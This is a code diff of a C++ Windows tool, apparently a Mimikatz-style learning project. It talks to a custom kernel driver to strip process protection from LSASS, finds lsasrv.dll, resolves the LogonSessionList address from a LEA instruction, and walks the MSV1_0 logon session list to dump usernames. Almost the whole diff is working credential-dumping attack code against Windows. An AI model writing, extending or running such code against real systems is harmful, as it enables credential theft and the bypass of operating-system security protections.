@@ -1,7 +1,4 @@
-#include <iostream>
-#include <windows.h>
-#include <winternl.h>
-
+#include "mimikatz_userland.h"
 
 
 //To DO: Edit reg keys and remove LSA Protection or just modify mem here..?
@@ -42,7 +39,7 @@ namespace driver {
 		//Must be buffered IO so we can send buffers between kernel and userland.
 
 		constexpr ULONG attach = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //setup the driver
-	
+
 		constexpr ULONG read = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //read process mem
 
 		constexpr ULONG write = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //write process mem.
@@ -54,6 +51,9 @@ namespace driver {
 		constexpr ULONG protect = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //protect process mem.
 
 		constexpr ULONG lssl = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //protect process mem.
+		
+		constexpr ULONG extract = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //protect process mem.
+
 	}
 
 	struct Request {
@@ -97,7 +97,7 @@ namespace driver {
 		return DeviceIoControl(hDriver, codes::unprotect, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
 	}
 
-	PVOID findLogonSessionList(HANDLE hDriver, PVOID pBase, PVOID pEnd) {		
+	PVOID findLogonSessionList(HANDLE hDriver, PVOID pBase, PVOID pEnd) {
 		Request req;
 		req.pBase = pBase;
 		req.pEnd = pEnd;
@@ -112,6 +112,15 @@ namespace driver {
 		}
 		printf("Pattern @ 0x%p\n", req.pattern);
 		return req.pattern;
+	}
+	bool extract(HANDLE hDriver, PVOID pBase) {
+		Request req;
+		req.pBase = pBase;
+		printf("Base of LogonSessionList with Offset: 0x%p\n", req.pBase);
+		DeviceIoControl(hDriver, codes::extract, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
+		return true;
+
+
 	}
 }
 
@@ -147,14 +156,14 @@ bool GetRemoteProcessHandle(HANDLE* hTarget, DWORD* PID) {
 		printf("SystemProcessInformation is empty...");
 		return 0;
 	}
-	
+
 
 	while (true) {
 		if (pSystemProcessInformation->ImageName.Length && wcscmp(pSystemProcessInformation->ImageName.Buffer, wProc) == 0) { //make sure the process ahs a name 
 			// openning a handle to the target process and saving it, then breaking 
 			wprintf(L"[i] Process \"%s\" - Of Pid : %d \n", pSystemProcessInformation->ImageName.Buffer, pSystemProcessInformation->UniqueProcessId);
 			*hTarget = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pSystemProcessInformation->UniqueProcessId);
-			*PID = (DWORD)pSystemProcessInformation->UniqueProcessId;			
+			*PID = (DWORD)pSystemProcessInformation->UniqueProcessId;
 			break;
 		}
 
@@ -186,10 +195,10 @@ static BOOL ReadUnicodeStringRemote(
 }
 
 
-bool findLsasrv(HANDLE hTarget, PEB peb, PVOID* pTargetModuleBase, ULONG* pSize ) {
+bool findLsasrv(HANDLE hTarget, PEB peb, PVOID* pTargetModuleBase, ULONG* pSize) {
 	*pTargetModuleBase = NULL;
 	printf("In NTLM\n");
-	
+
 	wprintf(L"SEARCHING FOR: %s\n", wTargetDLL);
 
 	// 3) Read remote PEB_LDR_DATA
@@ -266,18 +275,18 @@ bool findLsasrv(HANDLE hTarget, PEB peb, PVOID* pTargetModuleBase, ULONG* pSize 
 	return FALSE;
 }
 
-bool locatePEB(HANDLE hTarget,PVOID* pPEB) {
+bool locatePEB(HANDLE hTarget, PVOID* pPEB) {
 	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
 	if (!hNtdll) return false;
 
 	printf("NTDLL Handle\n");
-	fnNtQueryInformationProcess pNtQueryInformationProcess =(fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
 	if (!pNtQueryInformationProcess) return false;
 
-	PROCESS_BASIC_INFORMATION pProcBasicInfo = { 0 };  
+	PROCESS_BASIC_INFORMATION pProcBasicInfo = { 0 };
 	ULONG ulRetLength = 0;
 
-	NTSTATUS status = pNtQueryInformationProcess(hTarget,ProcessBasicInformation, &pProcBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &ulRetLength);
+	NTSTATUS status = pNtQueryInformationProcess(hTarget, ProcessBasicInformation, &pProcBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &ulRetLength);
 
 	if (!NT_SUCCESS(status)) {
 		return false;
@@ -299,6 +308,64 @@ typedef struct _LSA_LOGON_SESSION {
 	UNICODE_STRING Domain;    // 0xa0
 } LSA_LOGON_SESSION;
 
+void userlandExtraction(HANDLE hTarget, PVOID pLogonSessionList) {
+	// Step 1: read the head pointer (points into LSASS memory)
+	PKIWI_MSV1_0_LIST_63 headPtr = NULL;
+	if (!ReadProcessMemory(hTarget, pLogonSessionList, &headPtr, sizeof(headPtr), NULL) || !headPtr) {
+		printf("[-] Failed to read head pointer\n");
+		return;
+	}
+
+	// Step 2: read the head node structure
+	KIWI_MSV1_0_LIST_63 head = { 0 };
+	if (!ReadProcessMemory(hTarget, headPtr, &head, sizeof(head), NULL)) {
+		printf("[-] Failed to read head struct\n");
+		return;
+	}
+
+	// Step 3: iterate the linked list
+	PKIWI_MSV1_0_LIST_63 current = head.Flink;
+	while (current && current != headPtr) {
+		KIWI_MSV1_0_LIST_63 node = { 0 };
+		if (!ReadProcessMemory(hTarget, current, &node, sizeof(node), NULL)) {
+			printf("[-] Failed to read node @ %p\n", current);
+			break;
+		}
+
+		// Step 4: read the username if present
+		if (node.UserName.Buffer && node.UserName.Length > 0) {
+			wchar_t buffer[256] = { 0 };
+			SIZE_T bytesToRead = min(node.UserName.Length, sizeof(buffer) - sizeof(wchar_t));
+
+			if (ReadProcessMemory(hTarget, node.UserName.Buffer, buffer, bytesToRead, NULL)) {
+				// Length is in bytes, so divide by sizeof(WCHAR)
+				wprintf(L"[+] Username: %.*s\n", node.UserName.Length / sizeof(WCHAR), buffer);
+			}
+			else {
+				printf("[-] Failed to read username buffer @ %p\n", node.UserName.Buffer);
+			}
+		}
+		else {
+			printf("[*] NO USERNAME\n");
+		}
+
+		// Step 5: advance
+		current = node.Flink;
+	}
+}
+
+uintptr_t get_rip_relative_address(uint8_t* instr)
+{
+	// instr points to the LEA instruction (0x48 0x8d 0x0d ...)
+	int32_t offset;
+	// offset is at bytes 3..6 (little endian)
+	offset = *(int32_t*)(instr + 3);
+
+	// RIP is the address of the next instruction
+	uintptr_t rip = (uintptr_t)(instr + 7);
+
+	return rip + offset;
+}
 
 int main(int argc, wchar_t* argv[]) {
 	//Driver stuf...
@@ -333,20 +400,20 @@ int main(int argc, wchar_t* argv[]) {
 	}
 
 
-	
+
 	//PVOID pEPROCESS = driver::getEPROCESS(hDriver);
 
 	//printf("EPROCESS found at 0x%p....\n", pEPROCESS);
 
 	//Retr EPROCESS
 
-	
+
 	//Now that process protections are disabled we can ready process memory from userland.
 
 	//Step 1. Locate PEB
 	PVOID pRemotePEB;
 	PEB pLocalPEBofRemotePEB;
-	
+
 	if (!locatePEB(hTarget, &pRemotePEB)) {
 		printf("locatePEB failed\n");
 		return 1;
@@ -360,11 +427,11 @@ int main(int argc, wchar_t* argv[]) {
 	printf("PEB Pointer found\n");
 
 	printf("Bytes: %zu\n", sBytesTransferred);
-	
+
 	PVOID pLsasrv = NULL;
 	ULONG uSize = NULL;
 	printf("Outside NTLM\n");
-	findLsasrv(hTarget, pLocalPEBofRemotePEB, &pLsasrv,&uSize);
+	findLsasrv(hTarget, pLocalPEBofRemotePEB, &pLsasrv, &uSize);
 
 	HMODULE hLsasrv = NULL;
 	SIZE_T sLsasrv;
@@ -374,19 +441,35 @@ int main(int argc, wchar_t* argv[]) {
 	PVOID pLsl = NULL;
 	PVOID pEnd = (BYTE*)pLsasrv + (SIZE_T)uSize;
 
-	pLsl = driver::findLogonSessionList(hDriver, pLsasrv, pEnd);
+	pLsl = (BYTE*)driver::findLogonSessionList(hDriver, pLsasrv, pEnd);
 
-	if (pLsl == 0) {
-		printf("Error finding LSL offset...\n");
+	// JE instruction lives at offset +0x14
+	PVOID pLslActual = (PVOID)((BYTE*)pLsl + 0x14); //offset to 00007ffd`fc17e398 488d0d915b1200  lea     rcx,[lsasrv!LogonSessionList (00007ffd`fc2a3f30)] lea instruction to retr address
+
+	BYTE leaBytes[7];
+	SIZE_T bytesRead;
+	UINT64 target;
+
+	if (!ReadProcessMemory(hTarget, pLslActual, leaBytes, sizeof(leaBytes), &bytesRead) || bytesRead != sizeof(leaBytes)) {
+		printf("Failed to read remote memory. Error: %lu\n", GetLastError());
+		CloseHandle(hTarget);
+		return 1;
+	}
+	if (bytesRead == sizeof(leaBytes) && leaBytes[0] == 0x48 && leaBytes[1] == 0x8D && leaBytes[2] == 0x0D) {
+		// extract displacement
+		int32_t disp32 = *(int32_t*)&leaBytes[3];
+
+		// next instruction is leaAddr + 7
+		UINT64 nextInstr = (UINT64)pLslActual + 7;
+
+		target = nextInstr + disp32;
+
+		printf("RIP-relative target = 0x%llx\n", target); //i need to learn how this shit works like actually cos this is so confusing.
 	}
 
-	//PVOID pLogonSessionList = (PVOID)((ULONG_PTR)pLsasrv + pLsl); //matches earlier calculation..hopefully..
-
-	printf("Logon Session List: 0x%p...\n", pLsl);
-
-	//now confirm in windbg?
-
-
+	PVOID pLogonSessionList = (PVOID)(uintptr_t)target;
+	userlandExtraction(hTarget, (PVOID)pLogonSessionList);
+	
 	std::cout << "Hello world\n";
 
 	return 0;
